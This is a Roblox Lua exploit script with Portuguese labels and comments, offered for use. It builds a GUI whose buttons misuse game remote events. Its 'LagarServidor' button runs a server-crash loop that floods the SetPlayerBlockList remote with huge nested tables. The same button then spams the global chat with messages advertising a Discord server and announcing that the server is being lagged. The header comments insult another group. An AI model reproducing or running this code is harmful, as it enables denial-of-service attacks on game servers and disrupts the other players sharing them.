-- Feito por pscxq [DISCORD]
-- Reddyners sao uns merdas

-- Instances:

local Screen = Instance.new("ScreenGui")
local reddyneocaralho = Instance.new("Frame")
local Acao2 = Instance.new("TextButton")
local TextBox = Instance.new("TextBox")
local Acao1 = Instance.new("TextButton")
local Musica = Instance.new("TextButton")
local Lag = Instance.new("TextButton")
local Players = Instance.new("Frame")
local List = Instance.new("ScrollingFrame")
local UI = Instance.new("UIListLayout")
local Sample = Instance.new("TextLabel")
local TextLabel = Instance.new("TextLabel")

--Properties:

Screen.Name = "Screen"
Screen.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

reddyneocaralho.Name = "reddyneocaralho"
reddyneocaralho.Parent = Screen
reddyneocaralho.BackgroundColor3 = Color3.fromRGB(54, 54, 54)
reddyneocaralho.BackgroundTransparency = 0.600
reddyneocaralho.BorderColor3 = Color3.fromRGB(0, 0, 0)
reddyneocaralho.BorderSizePixel = 2
reddyneocaralho.Position = UDim2.new(0.226008803, 0, 0.646938801, 0)
reddyneocaralho.Size = UDim2.new(0.188215792, 0, 0.318367332, 0)

Acao2.Name = "Acao2"
Acao2.Parent = reddyneocaralho
Acao2.BackgroundColor3 = Color3.fromRGB(255, 255, 127)
Acao2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Acao2.BorderSizePixel = 0
Acao2.Position = UDim2.new(0.0474452563, 0, 0.756410241, 0)
Acao2.Size = UDim2.new(0.281021893, 0, 0.134615391, 0)
Acao2.Font = Enum.Font.SourceSans
Acao2.Text = "votar pra ficar"
Acao2.TextColor3 = Color3.fromRGB(0, 0, 0)
Acao2.TextScaled = true
Acao2.TextSize = 14.000
Acao2.TextWrapped = true

TextBox.Parent = reddyneocaralho
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 127)
TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.266423345, 0, 0.358974367, 0)
TextBox.Size = UDim2.new(0.463503659, 0, 0.198717952, 0)
TextBox.Font = Enum.Font.SourceSans
TextBox.PlaceholderText = "Pessoa"
TextBox.Text = "Pessoa"
TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextSize = 14.000

Acao1.Name = "Acao1"
Acao1.Parent = reddyneocaralho
Acao1.BackgroundColor3 = Color3.fromRGB(255, 255, 127)
Acao1.BorderColor3 = Color3.fromRGB(0, 0, 0)
Acao1.BorderSizePixel = 0
Acao1.Position = UDim2.new(0.0474452563, 0, 0.0961538479, 0)
Acao1.Size = UDim2.new(0.281021893, 0, 0.134615391, 0)
Acao1.Font = Enum.Font.SourceSans
Acao1.Text = "Tentar lagar o servidor"
Acao1.TextColor3 = Color3.fromRGB(0, 0, 0)
Acao1.TextScaled = true
Acao1.TextSize = 14.000
Acao1.TextWrapped = true

Musica.Name = "Musica"
Musica.Parent = reddyneocaralho
Musica.BackgroundColor3 = Color3.fromRGB(255, 255, 127)
Musica.BorderColor3 = Color3.fromRGB(0, 0, 0)
Musica.BorderSizePixel = 0
Musica.Position = UDim2.new(0.645985425, 0, 0.756410241, 0)
Musica.Size = UDim2.new(0.281021893, 0, 0.134615391, 0)
Musica.Font = Enum.Font.SourceSans
Musica.Text = "Musica midia"
Musica.TextColor3 = Color3.fromRGB(0, 0, 0)
Musica.TextScaled = true
Musica.TextSize = 14.000
Musica.TextWrapped = true

Lag.Name = "Lag"
Lag.Parent = reddyneocaralho
Lag.BackgroundColor3 = Color3.fromRGB(255, 255, 127)
Lag.BorderColor3 = Color3.fromRGB(0, 0, 0)
Lag.BorderSizePixel = 0
Lag.Position = UDim2.new(0.645985365, 0, 0.0897435918, 0)
Lag.Size = UDim2.new(0, 71, 0, 28)
Lag.Font = Enum.Font.SourceSans
Lag.Text = "LagarServidor"
Lag.TextColor3 = Color3.fromRGB(0, 0, 0)
Lag.TextSize = 14.000

Players.Name = "Players"
Players.Parent = Screen
Players.AnchorPoint = Vector2.new(0.5, 0.5)
Players.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
Players.BackgroundTransparency = 0.600
Players.BorderColor3 = Color3.fromRGB(0, 0, 0)
Players.BorderSizePixel = 2
Players.Position = UDim2.new(0.152669057, 0, 0.716326535, 0)
Players.Size = UDim2.new(0.128152505, 0, 0.5, 0)

List.Name = "List"
List.Parent = Players
List.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
List.BackgroundTransparency = 1.000
List.BorderSizePixel = 0
List.Position = UDim2.new(0, 0, 0.109999999, 0)
List.Size = UDim2.new(1, 0, 0.889999986, 0)
List.ScrollBarThickness = 6

UI.Name = "UI"
UI.Parent = List
UI.SortOrder = Enum.SortOrder.LayoutOrder

Sample.Name = "Sample"
Sample.Parent = game.StarterGui.Screen.Players.Main
Sample.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Sample.BackgroundTransparency = 1.000
Sample.Size = UDim2.new(0, 0, 0.0816326514, 0)
Sample.Font = Enum.Font.SourceSansSemibold
Sample.Text = "UsernameHere"
Sample.TextColor3 = Color3.fromRGB(0, 0, 0)
Sample.TextScaled = true
Sample.TextSize = 14.000
Sample.TextWrapped = true

TextLabel.Parent = Screen
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.226008803, 0, 0.930612266, 0)
TextLabel.Size = UDim2.new(0.0927384421, 0, 0.0346938781, 0)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "(Precisa de uma pessoa)"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

-- Scripts:

local function LBZZDP_fake_script() -- Screen.LocalScript 
	local script = Instance.new('LocalScript', Screen)

	script.Parent.Plr:GetPropertyChangedSignal("Value"):Connect(function()
		script.Parent.reddyneocaralho.TextBox.Text = script.Parent.Plr.Value
	end)
	--
	script.Parent.reddyneocaralho.Musica.MouseButton1Down:Connect(function()
	    sound = true 
		local ID = "rbxassetid://5647277440" 
		local Name = "ambiente" 
		local Volume = 100 
		local Pitch = 1 
	
		for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
			if v:IsA("RemoteEvent") and v.Name == "AC6_FE_Sounds" then
				if sound == true then
					v:FireServer("newSound", Name, workspace, ID, Pitch, Volume, true)
					v:FireServer("playSound", Name)
				end 
	
				if sound == false then
					v:FireServer("stopSound", Name)
				end
			end
		end
	
	end)
	script.Parent.reddyneocaralho.Acao1.MouseButton1Click:Connect(function()
		local evento = game.ReplicatedStorage.Iniciar
		evento:FireServer()
	end)
	script.Parent.reddyneocaralho.Acao2.MouseButton1Click:Connect(function()
		local evento = game.ReplicatedStorage.votacao_para_ficar
		local pessoa = script.Parent.reddyneocaralho.TextBox.Text
		evento:FireServer(pessoa)
		print(pessoa)
	end)
	--
	script.Parent.reddyneocaralho.Lag.MouseButton1Click:Connect(function()
		local char = game:GetService('Players').LocalPlayer.Character or nil
		if char then
			char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
			task.wait(0.5)
			char.HumanoidRootPart.Anchored = true
		end
		while wait(1.5) do --// don't change it's the best
			game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
			local function getmaxvalue(val)
				local mainvalueifonetable = 499999
				if type(val) ~= "number" then
					return nil
				end
				local calculateperfectval = (mainvalueifonetable/(val+2))
				return calculateperfectval
			end
	
			local function bomb(tableincrease, tries)
				local maintable = {}
				local spammedtable = {}
	
				table.insert(spammedtable, {})
				z = spammedtable[1]
	
				for i = 1, tableincrease do
					local tableins = {}
					table.insert(z, tableins)
					z = tableins
				end
	
				local calculatemax = getmaxvalue(tableincrease)
				local maximum
	
				if calculatemax then
					maximum = calculatemax
				else
					maximum = 999999
				end
	
				for i = 1, maximum do
					table.insert(maintable, spammedtable)
				end
	
				for i = 1, tries do
					game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
				end
			end
	
			bomb(289, 5) --// change values if client crashes
		end
		
		for _,s in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
			if s:IsA("Motor6D") and s.Name ~= "Neck" then
				local fard = s.Parent
				s:Destroy()
				fard.CFrame = CFrame.new(9e9 * _,9e9* _,9e9*_)
				wait()
			end
		end
		
		--[[
	
	███╗   ███╗ █████╗ ██████╗ ██╗   ██╗ ██████╗ ██████╗ ██╗    ██╗ █████╗ ██████╗ ███████╗
	████╗ ████║██╔══██╗██╔══██╗██║   ██║██╔════╝██╔═══██╗██║    ██║██╔══██╗██╔══██╗██╔════╝
	██╔████╔██║███████║██████╔╝██║   ██║██║     ██║   ██║██║ █╗ ██║███████║██████╔╝█████╗
	██║╚██╔╝██║██╔══██║██╔══██╗╚██╗ ██╔╝██║     ██║   ██║██║███╗██║██╔══██║██╔══██╗██╔══╝
	██║ ╚═╝ ██║██║  ██║██║  ██║ ╚████╔╝ ╚██████╗╚██████╔╝╚███╔███╔╝██║  ██║██║  ██║███████╗
	╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝   ╚═════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
	
	]]--
		local char = game:GetService('Players').LocalPlayer.Character or nil
		if char then
			char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
			task.wait(0.5)
			char.HumanoidRootPart.Anchored = true
		end
		while wait(1.5) do --// don't change it's the best
			game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
			local function getmaxvalue(val)
				local mainvalueifonetable = 499999
				if type(val) ~= "number" then
					return nil
				end
				local calculateperfectval = (mainvalueifonetable/(val+2))
				return calculateperfectval
			end
	
			local function bomb(tableincrease, tries)
				local maintable = {}
				local spammedtable = {}
	
				table.insert(spammedtable, {})
				z = spammedtable[1]
	
				for i = 1, tableincrease do
					local tableins = {}
					table.insert(z, tableins)
					z = tableins
				end
	
				local calculatemax = getmaxvalue(tableincrease)
				local maximum
	
				if calculatemax then
					maximum = calculatemax
				else
					maximum = 999999
				end
	
				for i = 1, maximum do
					table.insert(maintable, spammedtable)
				end
	
				for i = 1, tries do
					game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
				end
			end
	
			bomb(289, 5) --// change values if client crashes
		end
		local phrases = {"marvco4362 | my server is .gg/soggy join it for the script", "marvco4362 | im lagging this server i hate all of you", "marvco4362 | together we can get rid of all the script kiddies"}
	
		while true do
			for i = 1, 5 do
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(phrases[i], "All")
				wait(2.25)
			end
		end
	end)
end
coroutine.wrap(LBZZDP_fake_script)()
local function YFTN_fake_script() -- Players.Main 
	local script = Instance.new('LocalScript', Players)

	local plrList = script.Parent.List
	local sample = script.Sample
	function clearList()
		for _, item in pairs(plrList:GetChildren()) do
			if item:IsA("TextLabel") then
				item:Destroy()
			end
		end
	end
	function fillList()
		clearList()
		for _, player in pairs(game.Players:GetChildren()) do
			if not plrList:FindFirstChild(player.Name) then
				local new = sample:Clone()
				new.Name = player.Name
				new.Text = player.Name
				new.Parent = plrList
			end
		end
		plrList.CanvasSize = UDim2.new(0, 0, 0, plrList.UI.AbsoluteContentSize.Y)
	end
	fillList()
	game.Players.PlayerAdded:Connect(fillList)
	game.Players.PlayerRemoving:Connect(fillList)
end
coroutine.wrap(YFTN_fake_script)()
local function QGBEY_fake_script() -- Sample.LocalScript 
	local script = Instance.new('LocalScript', Sample)

	script.Parent.MouseEnter:Connect(function()
		script.Parent.Parent.Parent.Parent.Plr.Value = script.Parent.Text
	end)
end
coroutine.wrap(QGBEY_fake_script)()
